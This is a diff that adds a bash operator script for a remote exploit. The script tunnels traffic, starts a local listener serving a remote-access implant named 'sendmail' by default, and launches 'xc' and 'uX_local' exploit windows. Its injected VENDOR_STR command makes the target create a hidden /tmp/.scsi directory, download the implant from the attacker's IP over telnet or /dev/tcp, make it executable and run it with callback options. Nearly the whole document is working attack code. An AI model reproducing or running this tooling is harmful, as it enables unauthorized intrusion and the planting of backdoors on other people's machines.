@@ -1,0 +1,515 @@
+#!/bin/bash
+PROG=`basename ${0}`
+VER="1.3"
+CALLBACKDELAY=3
+AUTOMODE="$TARGETIP"
+[ "$TUNNELPORT" ] || TUNNELPORT=`cat /current/bin/.tunnelport 2>/dev/null`
+[ "$TUNNELPORT" ] || TUNNELPORT=18787
+COLOR_SUCCESS="\\033[1;32m"
+COLOR_FAILURE="\\033[1;31m"
+COLOR_WARNING="\\033[1;33m"
+COLOR_NORMAL="\\033[0;39m"
+COLOR_NOTE="\\033[0;34m"
+COLOR_WHITE="\\033[4;97m"
+SETCOLOR_SUCCESS="echo -en $COLOR_SUCCESS"
+SETCOLOR_FAILURE="echo -en $COLOR_FAILURE"
+SETCOLOR_WARNING="echo -en $COLOR_WARNING"
+SETCOLOR_NORMAL="echo -en $COLOR_NORMAL"
+SETCOLOR_NOTE="echo -en $COLOR_NOTE"
+SETCOLOR_WHITE="echo -en $COLOR_WHITE"
+usagetext="
+Usage: $PROG
+
+-i IP     IP of target machine (NO DEFAULT)
+-l IP     IP of attack machine (Default: the first active IP found in
+          this order: ppp0, ppp1, eth0 or eth1) 
+-n #      rat upload port (Default: a random port)
+-p #      Use port # for RAT listen/callback. (Default: random)
+-s #      Change delay used for -c to # seconds (must appear before -c).
+-c        Use NOPEN syntax to have RAT callback after a delay (Default
+          delay: $CALLBACKDELAY seconds)
+-z        Do NOT use uncomrpess at the either end
+-r rat    name of rat on target (Default: sendmail)
+-x #      port to start mini X server on (Default: random port)
+-D dir    directory to work from/create on target (Default = /tmp/.scsi)
+-P        Assume PATH=. will fail so use ./ratname
+          target, and MUST NOT use uuencode on upload.
+-a ARCH   String used to determine which architecture NOPEN server to
+          upload from /current/up/morerats/ using this (note tail -1):
+          \"ls -1 ./noserver* 2>/dev/null | grep -i ${ARCH} | tail -1\".
+          If not provided or no match, /current/up/noserver is assumed.
+
+examples: 
+   $PROG -l 19.16.1.1 -i 10.0.3.1 -n 2222 -r nscd -x 9999 -D /tmp/.dir
+   $PROG -i 10.0.3.1
+   $PROG -i TARGET_IP -l REDIRECTOR_IP
+"
+usagetextshort=$usagetext
+
+note() {
+    if [ "$1" = "-n" ] ; then
+      N=$1
+      shift
+    fi
+    echo -e $N "$COLOR_NOTE${*}$COLOR_NORMAL"
+}
+notered() {
+    if [ "$1" = "-n" ] ; then
+      N=$1
+      shift
+    fi
+    echo -e $N "$COLOR_FAILURE${*}$COLOR_NORMAL"
+}
+tunnelcmd() {
+    echo "${*}"	| nc -w1 -u 127.0.0.1 $TUNNELPORT
+}
+
+usage ()
+{
+  [ "$1" = "exit" ] && EXIT=1 && shift
+  if [ "$1" = "-h" ] ; then
+    shift
+    echo -e "$usagetext"
+    notered NOTE: The only REQUIRED ARGUMENT is now -i
+    echo "
+The best way to back out of $PROG once done (whether or not you get on
+target) is to kill off the packrat window first with ^C then ^D. Then
+kill of the xc window the same way, finally kill the ys.auto.
+
+$PROG Version $VER"
+  fi
+  if [ "$1" = "-v" ] ; then
+    echo "$PROG version $VER"
+    shift
+  fi
+  ERRSTR="${*}"
+  if [ "$ERRSTR" ] ; then
+    notered "\a${ERRSTR}"
+  fi
+  [ "$EXIT" ] && exit
+} # usage
+
+doit() {
+    CMDLINE="\nCommandLine: ${0} ${*}"
+
+    if [ $# -lt 1 ] ; then
+	usage exit -h
+    fi
+
+    while getopts hl:n:r:D:x:zi:ucs:p:Pva: optvar ; do
+	case "$optvar"   in
+	    h|v) usage exit -$optvar ;;
+	    i) REMOTE_IP=${OPTARG}  ;;
+	    l) CALLBACKIP=${OPTARG}  ;;
+	    c) CALLBACK=" callback";;
+	    n) LOCAL_PORT=${OPTARG} ;;
+	    r) RAT_NAME=${OPTARG}  ;;
+	    x) XPORT=${OPTARG} ;;
+	    D) DIR=${OPTARG} ;;
+	    u) NOUU=yes ;;
+	    p) NOPENPORT="$OPTARG";;
+	    s) CALLBACKDELAY="$OPTARG";;
+	    z) NOZIP=yes
+		PACKARGS="$PACKARGS -z" ;;
+	    P) DOTSLASH="./";;
+	    k) USEKSH=yes
+		# this is not working dammit 
+		NOUU=yes;;
+	    # In -a, ignore it if ARCH already defined by autoattack
+	    a) [ "$ARCH" ] || ARCH="$OPTARG";;
+	    *) usage exit Invalid option $! ;;
+	esac
+    done
+
+    [ "${DIR}" ] || DIR="/tmp/.scsi"
+    [ "${XPORT}" ] || XPORT=`mkrandom -n 2>/dev/null`
+    [ "${XPORT}" ] || XPORT=12121
+    
+    if [ ! "$CALLBACKIP" ] ; then
+	if [ ! "`which grepip 2>/dev/null`" ] ; then
+	    notered "\aMust have \"grepip\" in path or provide -l IP on command line"
+	    exit
+	fi
+	for INT in ppp0 ppp1 eth0 eth1 ; do 
+	    ADDR=`ifconfig $INT 2>/dev/null | grepip | egrep -v "255|127\.0" | head -1`
+	    [ "$ADDR" ] && CALLBACKIP=$ADDR
+	    [ "$CALLBACKIP" ] && break
+	done
+	while [ ! "$CALLBACKIP" ] ; do
+	    echo -en "What is your local/redirector IP address? "
+	    [ "$CALLBACKIP" ] && echo -en "[$CALLBACKIP] "
+	    read ans
+	    [ "$ans" -a "${ans:0:1}" != "y" -a "${ans:0:1}" != "Y" ] && \
+		CALLBACKIP=$ans
+	    CALLBACKIP=`echo $CALLBACKIP | grepip`
+	    [ "$ans" ] && echo -e "\n\n\a$ans is not a valid IP. Try again.\n\n"
+	done
+	INT=" ($INT)"
+	note "Using $CALLBACKIP$INT for -l local IP argument"
+    fi
+
+    if [ "`which grepip 2>/dev/null`" ] ; then
+	# Check IP arguments if we can
+	[ "$REMOTE_IP" ] && ORIGREMOTE_IP=" ($REMOTE_IP)"
+	[ "$CALLBACKIP" ] && ORIGCALLBACKIP=" ($CALLBACKIP)"
+	REMOTE_IP=`echo $REMOTE_IP | grepip`
+	CALLBACKIP=`echo $CALLBACKIP | grepip`
+    fi
+
+    [ "$REMOTE_IP" ] || usage exit "-i argument$ORIGREMOTE_IP is missing or not an IP"
+    [ "$CALLBACKIP" ] || usage exit "-l argument$ORIGCALLBACKIP is missing or not an IP"
+    [ "$NOUU" ] && PACKARGS="$PACKARGS -u"
+    [ "$RAT_NAME" ] || RAT_NAME=sendmail
+    if [ ! "$NOPENPORT" ] ; then
+	NOPENPORT=`mkrandom -n 2>/dev/null`
+	if [ "$NOPENPORT" ] ; then
+	    note "Using random NOPEN$CALLBACK port $NOPENPORT"
+	fi
+    fi
+    [ ! "$NOPENPORT" ] && usage exit "mkrandom not in path--needed to generate random port"
+
+    ifconfig -a | grep $CALLBACKIP > /dev/null && ITSLOCAL=yes
+    if [ ! "$ITSLOCAL" ] ; then
+	REDIRECTOR="/redirector"
+	[ "$TARGETIP" ] && REDIRECTOR2=" $TARGETIP via $CALLBACKIP via "
+    fi
+    echo
+    note "########################################"
+    [ "$REDIRECTOR" ] || notered "Calling directly back to this box"
+    note "Local$REDIRECTOR IP = ${CALLBACKIP}$INT"
+    [ "$CALLBACK" ] && note "Using NOPEN Callback to $CALLBACKIP:$NOPENPORT"
+    [ "$CALLBACK" ] && notered "     (after a DELAY of $CALLBACKDELAY seconds)"
+    [ "$NOSERVER" ] && note Uploading rat: $NOSERVER
+    [ "$CALLBACK" ] || note "Starting rat listener on port ${NOPENPORT}"
+    note "Remote IP =$REDIRECTOR2 ${REMOTE_IP}"
+    note "Rat uplaod port = ${LOCAL_PORT}"
+    note "Name of Rat = ${RAT_NAME}"
+    [ "$NOZIP" ] && note "Not using compress/uncompress"
+    [ "$NOZIP" ] || note "Using compress/uncompress"
+    note "Starting mini X server on port ${XPORT}"
+    note "Directory to create/use = ${DIR}"
+    #[ "$USEKSH" ] && note "Using ksh method to upload rat to Solaris target"
+    #[ "$USEKSH" ] || note "Using telnet method to upload rat"
+    note "########################################"
+    echo
+
+    # show what we were called with
+    echo -e "$CMDLINE"
+
+    # Check to make sure tcp LISTEN is there
+    PORTS=`netstat -an | grep tcp.*LIST | cut -f 2 -d ":" | sort -rn | awk '{print $1}' |egrep -v "6000"`
+    
+    note Local ports LISTENing: $PORTS
+    echo
+    which packrat >/dev/null 2>&1
+    NOPACKRAT=$?
+    [ "$NOPACKRAT" = "0" ] || usage exit "No packrat in your path"
+    
+    if [ "$LOCAL_PORT" ] ; then
+	for i in $PORTS -1 ; do
+	    [ "$i" = "$LOCAL_PORT" ] && break
+	done
+	if [  $i -lt 0 ] ; then
+	    PACKRAT_SCRIPME=yes
+	else
+	    notered "\aLocalPort=$LOCAL_PORT provided on command line already LISTENing. Assuming that is the upload."
+	    sleep 2
+	fi
+    else
+	unset ans MAKENEWPORT
+	if [ "$RANDOMLOCAL_PORT" ] ; then
+	    $LOCAL_PORT=$RANDOMLOCAL_PORT
+	else
+	    MAKENEWPORT=1
+	fi
+	while [ "$MAKENEWPORT" ] ; do
+	    LOCAL_PORT=`mkrandom -n 2>/dev/null`
+	    RANDOMORNOT=" a random"
+	    RANDOMLOCAL_PORT=$LOCAL_PORT
+	    [ ! "$LOCAL_PORT" ] && usage exit "mkrandom not in path--needed to generate random rat upload port"
+	    ALREADYTHERE=`netstat -an | grep tcp.*LIST | grep ":$LOCAL_PORT "`
+	    [ "$ALREADYTHERE" ] || break
+	done
+	while [ ! -e $NOSERVER ] ; do
+	    notered Put correct noserver into $NOSERVER and hit return or ^C to abort.
+	    read ans
+	    continue
+	done
+	if [ "$NOPACKRAT" = "0" ] ; then
+	    PACKRAT_SCRIPME=yes
+	else
+	    usage exit "No packrat in your path$COLOR_NORMAL"
+	fi
+    fi
+    note "Using$RANDOMORNOT port ($LOCAL_PORT) for local RAT upload listener (packrat)"
+    unset RANDOMORNOT
+    if [ "${REMOTE_IP:0:3}" = "127" ] ; then
+	REDIRECT=yes
+	ifconfig -a | grep $CALLBACKIP > /dev/null && NOTGOOD=yes
+	if [ "$NOTGOOD" ] ; then
+	   notered "ARE YOU SURE? It looks like you are redirecting (due to remote being $REMOTE_IP),
+and yet you want the RAT callback to go to $CALLBACKIP, WHICH\a IS ONE OF YOUR LOCAL IPs???"
+	    sleep 1
+	    notered -n "\n<A>bort to <C>ontinue DESPITE THIS PROBLEM!! [C]\a"
+	    read blah
+	    if [ "${blah:0:1}" = 'a' -o "${blah:0:1}" = 'A' ] ; then
+		notered "ABORTING!"
+		exit
+	    fi
+	fi
+	DEFTARGET=`head /current/etc/opscript.txt 2>/dev/null | grepip 2>/dev/null | head -1`
+	[ ! "$ACTUALTARGET" ] && [ "$AUTOMODE" ] && ACTUALTARGET=$TARGETIP
+	until [ `echo $ACTUALTARGET | grepip 2>/dev/null` ] ; do
+	    [ "$ACTUALTARGET" ] && echo Bad IP $ACTUALTARGET
+	    echo -en "\nEnter Target IP after redirecting through $LOCAL_IP: "
+	    [ "$DEFTARGET" ] &&  echo -en "[$DEFTARGET] " 
+	    read ACTUALTARGET
+	    [ ! "$ACTUALTARGET" ] && [ "$DEFTARGET" ] && ACTUALTARGET=$DEFTARGET
+	done
+	note Redirecting via 127.0.0.1/$LOCAL_IP to $ACTUALTARGET
+	if [ "$AUTOMODE" ] ; then
+	    # Anything specific to automated usage here
+	    note In AUTO/-sploit mode
+	fi
+	note "Sending tunnel commands to 127.0.0.1:$TUNNELPORT"
+	tunnelcmd u 177 $ACTUALTARGET
+	tunnelcmd r $LOCAL_PORT
+	tunnelcmd r $XPORT
+	tunnelcmd s
+	
+    fi
+    [ "$ACTUALTARGET" ] || ACTUALTARGET=$REMOTE_IP
+    
+    if [ "$PACKRAT_SCRIPME" ] ; then
+	if [ -x /current/bin/nc.YS ] ; then
+	    PACKARGS="$PACKARGS -n /current/bin/nc.YS"
+	fi
+	EXPLOIT_SCRIPME="packrat$PACKARGS $RAT_NAME $NOSERVER $LOCAL_PORT"
+	note "\nStarting local LISTENer to send noserver via port $LOCAL_PORT\n"
+	export EXPLOIT_SCRIPME
+	echo EXPLOIT_SCRIPME=\"$EXPLOIT_SCRIPME\"  scripme -t PACKRAT -F -X \"-bg slategrey -fg white -geometry 131x55-0+0\"
+	EXPLOIT_SCRIPME="$EXPLOIT_SCRIPME" scripme -t PACKRAT -F -X "-bg slategrey -fg white -geometry 131x55-0+0"
+    fi
+    if [ "$REDIRECT" ] ; then
+	if [ "$CALLBACK" ] ; then
+	    note "\n\nYou will need a NOPEN listener window on $CALLBACKIP:\n"
+	fi
+	PASTABLE=`grep -v "^#" /current/down/didthis 2>/dev/null | egrep "nstun|noclient"`
+	PASTABLE="\ncd /current/down\n${PASTABLE}"
+
+	note "${PASTABLE}"
+	#  echo "FIRST/-tunnel nopen window on $CALLBACKIP:"
+	#  SECOND="SECOND "
+	#  note "\n-tunnel\n\nu 177 $ACTUALTARGET\nr $LOCAL_PORT\nr $XPORT\n\ns\n"
+	if [ ! "$CALLBACK" ] ; then
+	    notered -n "<A>bort <C>ontinue once NOPEN and packrat windows are ready [C] "
+	    read blah
+	    if [ "${blah:0:1}" = 'a' -o "${blah:0:1}" = 'A' ] ; then
+		notered "ABORTING!"
+		exit
+	    fi
+	fi
+    fi
+
+    if [ "$CALLBACK" ] ; then
+	RAT_PREARGS=" S=$CALLBACKDELAY D=-c${CALLBACKIP}:${NOPENPORT}"
+	notered "\aYou must establish a NOPEN listener on $CALLBACKIP:$NOPENPORT\n\n"
+	if [ "$REDIRECT" ] ; then
+	    if [ "$ITSLOCAL" ] ; then
+		echo "${SECOND}remote nopen window on $CALLBACKIP:"
+		note "${PASTABLE}\n/current/bin/noclient -l $NOPENPORT\n\n"
+	    else
+		echo "${SECOND}remote nopen window on $CALLBACKIP:"
+		note "${PASTABLE}\n-nrtun $NOPENPORT\n\n"
+	    fi
+	    notered -n "<A>bort <C>ontinue once NOPEN windows are ready [C] "
+	    read blah
+	    if [ "${blah:0:1}" = 'a' -o "${blah:0:1}" = 'A' ] ; then
+		notered "ABORTING!"
+		exit
+	    fi
+	else
+	    echo "${SECOND}remote nopen window on $CALLBACKIP:"
+	    note "\ncd /current/down/\n/current/bin/noclient -l $NOPENPORT\n\n"
+	    notered -n "<A>bort <C>ontinue once NOPEN windows are ready [C] "
+	    read blah
+	    if [ "${blah:0:1}" = 'a' -o "${blah:0:1}" = 'A' ] ; then
+		notered "ABORTING!"
+		exit
+	    fi
+	fi
+    else
+	RAT_PREARGS=" D=-l${NOPENPORT}"
+	if [ "$REDIRECT" ] ; then
+	    POSTRUN="${PASTABLE}
+
+-nstun $ACTUALTARGET ${NOPENPORT}"
+	else
+	    POSTRUN="noclient ${ACTUALTARGET}:${NOPENPORT}"
+	fi
+    fi
+
+    # Now check what we can before continuing
+    echo ""
+    while [ 1 ] ; do
+
+	[ "$CALLBACK" ] || OKNRTUN=okeydokey
+	[ "$REDIRECT" ] || OKUDP=okeydokey
+	[ "$REDIRECT" ] && OKUDP=`netstat -an | grep "^udp.*0 0.0.0.0:177 "`
+	[ "$CALLBACK" ] && OKNRTUN=`netstat -an | grep "^tcp.*:$NOPENPORT " | egrep "ESTAB|LISTEN"`
+	OKPACKRAT=`netstat -an | grep "^tcp.*0.0.0.0:$LOCAL_PORT .*LISTEN"`
+	    
+	[ "$OKUDP" ] || notered "No udp/177 seen locally in netstat"
+	[ "$OKNRTUN" ] || notered "No -nrtun or noclient -l for callback seen locally on port $NOPENPORT in netstat"
+	if [ ! "$OKPACKRAT" ] ; then
+	    if [ "$OKUDP" -a "$OKNRTUN" ] ; then
+		notered "waiting for packrat to start on port $LOCAL_PORT"
+	    else
+		notered "No packrat seen locally on port $LOCAL_PORT in netstat"
+	    fi
+	fi
+	[ "$OKUDP" ] && [ "$OKNRTUN" ] && [ "$OKPACKRAT" ] && break
+
+	[ "$OKUDP" ] && [ "$OKNRTUN" ] && sleep 2 && continue
+	unset OKUDP OKNRTUN OKPACKRAT
+	notered "\a\n\nCANNOT PROCEED"
+	notered "\a\n\nFix this and either <A>bort or <R>etry. [R] "
+	read blah
+	if [ "${blah:0:1}" = 'a' -o "${blah:0:1}" = 'A' ] ; then
+	    notered "ABORTING!"
+	    exit
+	fi
+    done
+    unset OKUDP OKNRTUN OKPACKRAT
+    if [ "$CALLBACK" ] ; then
+	NOCLIENTCALL="cd /current/down\n../bin/noclient ${ACTUALTARGET}:$NOPENPORT"
+	[ "$REDIRECT" ] && NOCLIENTCALL="-nstun $ACTUALTARGET ${NOPENPORT}"
+	TAKENOTE="$TAKENOTE
+========================================================
+
+You did a NOPEN callback. Be sure to test a call FORWARD if you get on.
+Something like (${COLOR_FAILURE}each on the right box${COLOR_NORMAL}):
+
+-listen $NOPENPORT
+
+$NOCLIENTCALL
+"
+    fi
+    if [ "$POSTRUN" ] ; then
+	TAKENOTE="$TAKENOTE
+========================================================
+
+$POSTRUN
+"
+    fi
+    
+    if [ "$TAKENOTE" ] ; then
+	TAKENOTE="
+========================================================
+========================================================
+               NOTES/PASTABLES FOR LATER
+
+$TAKENOTE
+========================================================
+========================================================
+"
+    fi
+
+    #note "\nStarting local mini-X server via scripme"
+    note "\nStarting exploit xc via scripme"
+    EXPLOIT_SCRIPME="xc -x $CALLBACKIP -y $XPORT -s $CALLBACKIP $REMOTE_IP 2>&1"
+    echo EXPLOIT_SCRIPME=\"$EXPLOIT_SCRIPME\"  scripme -t YS-xc-window -F -X \"-fg white -bg black -geometry 131x55\"
+    EXPLOIT_SCRIPME="$EXPLOIT_SCRIPME"  scripme -t YS-xc.$ACTUALTARGET -F -X "-bg white -fg black -geometry 78x51+654+0"
+
+    unset UNCOMPRESS
+    if [ ! "$NOZIP" ] ; then
+	UNCOMPRESS=" && uncompress -f ${RAT_NAME}.Z 2>&1 "
+	[ "$USEKSH" ] && UNCOMPRESS=".Z && uncompress -f ${RAT_NAME}.Z 2>&1 "
+    fi
+
+    #old way:
+    #2>&1 </dev/console 2>&1 |uudecode 2>&1 > /dev/null 2>&1
+    #</dev/console |uudecode > /dev/null 2>&1
+    VENDOR_STR="\`cd /tmp;mkdir -p ${DIR} && cd ${DIR} ; telnet ${CALLBACKIP} ${LOCAL_PORT} </dev/console |uudecode > /dev/null 2>&1 $UNCOMPRESS && chmod 0700 ${RAT_NAME} && PATH=${DIR}:.${RAT_PREARGS} ${DOTSLASH}${RAT_NAME}\`"
+    #VENDOR_STR="\`mkdir ${DIR};cd ${DIR} && telnet ${CALLBACKIP} ${LOCAL_PORT} </dev/console |uudecode > /dev/null 2>&1 && uncompress -f ${RAT_NAME}.Z && chmod 0700 ${RAT_NAME} && PATH=${DIR} ${RAT_NAME}\`"
+    #if [ "$USEKSH" ] ; then
+    #    VENDOR_STR="\`cd /tmp;mkdir ${DIR} 2>&1 && cd ${DIR} 2>&1 ; /bin/ksh -c \"cat < /dev/tcp/${CALLBACKIP}/${LOCAL_PORT}> ${RAT_NAME}${UNCOMPRESS}\" ; chmod 0700 ${RAT_NAME} && PATH=${DIR}:.${RAT_PREARGS} ${DOTSLASH}${RAT_NAME}\`"
+    #fi
+
+    notered "\n\nNow running the following via:\n\n./uX_local -e '$VENDOR_STR' -v -p $XPORT -c xxx\n\n"
+    note "VENDOR_STR=\"$VENDOR_STR\"\n\n"
+
+    notered "RUNNING (yet another) SCRIPME window with the uX_local line shown above."
+    EXPLOIT_SCRIPME="./uX_local -e '$VENDOR_STR' -v -p $XPORT -c xxx"  scripme -t YS-uXlocal.$ACTUALTARGET -F -X "-bg white -fg black -geometry 78x51+76+0"
+
+} # end doit
+
+if [ "$ARCH" ] ; then
+    NOSERVER=`ls -1 /current/up/morerats/noserver* 2>/dev/null | grep -i ${ARCH} | tail -1`
+fi
+[ "$NOSERVER" ] || NOSERVER=/current/up/noserver
+
+[ "${*}" ] || usage exit -h
+[ "${*}" = "-h" ] && usage exit -h
+ATTEMPT=1
+while [ 1 ] ; do
+    if [ "$TARGETIP" -a "$ATTEMPT" = "1" ] ; then
+	echo -e "$usagetextshort"
+	# This is called by autoattack so allow changes
+	notered "Automatic mode has pre-set these arguments:\n$COLOR_NORMAL\n${*}\n"
+	notered "\n\nJust hit return to keep these arguments, or input a new and complete argument\nstring to use instead:\n"
+	read ans
+	if [ "$ans" ] ; then
+	    ARGS="$ans"
+	    note Changing arguments to: $ARGS
+	else
+	    note NOT changing arguments
+	fi
+    fi
+    if [ "$ARGS" ] ; then
+	OPTIND=1
+        doit $ARGS
+    else
+	OPTIND=1
+	ARGS="${*}"
+	doit ${*} 
+    fi
+
+#    note "\n\n$PROG attempt number $ATTEMPT is complete."
+    DATE=`date -u`
+    [ "$EXPLOIT_SCRIPME" ] && VIA=" via scripme popups"
+    note "\n\n$PROG attempt$VIA is complete at $DATE.\n\n"
+#    if [ "$CALLBACK" ] ; then
+    if [ "" ] ; then
+	notered "\nNOTE: Callback will not happen until $CALLBACKDELAY seconds or more have passed.\n"
+	while [ $CALLBACKDELAY -ge 0 ] ; do
+	    notered -n "\rCounting down: $CALLBACKDELAY  "
+	    CALLBACKDELAY=`expr $CALLBACKDELAY - 1`
+	    sleep 1
+	done
+    fi
+#    note "\nIf it worked, hit return to exit.\n"
+#    notered -n "Do you want to try again? [N] "
+#    read ans
+#    [ ! "$ans" -o "${ans:0:1}" = "n" -o "${ans:0:1}" = "N" ] && break
+
+    # No retries anymore - too messy
+    break
+    # echo -e "$usagetext" 
+    LASTARGS=$ARGS
+    note "\n\nYour last attempt tried the following arguments:\n\n"
+    note "$LASTARGS\n\n"
+    notered "\n\nJust hit return to try the same arguments again, or input a new and complete argument\nstring to use. Enter \"DONE\" or ^C to quit."
+    read ans
+    [ "$ans" = "DONE" ] && break
+    if [ "$ans" ] ; then
+	ARGS="${ans}"
+    fi
+    ATTEMPT=`expr $ATTEMPT + 1`
+
+done
+
+if [ ! -z "$AUTOMODE" ] ; then
+  notered "\n\nYou MUST ${COLOR_NOTE}FIRST$COLOR_FAILURE ^C and then ^D in each of the netcat,
+uX_local and xc scripme windows started earlier to be able to exit this window.\n\n"
+fi 
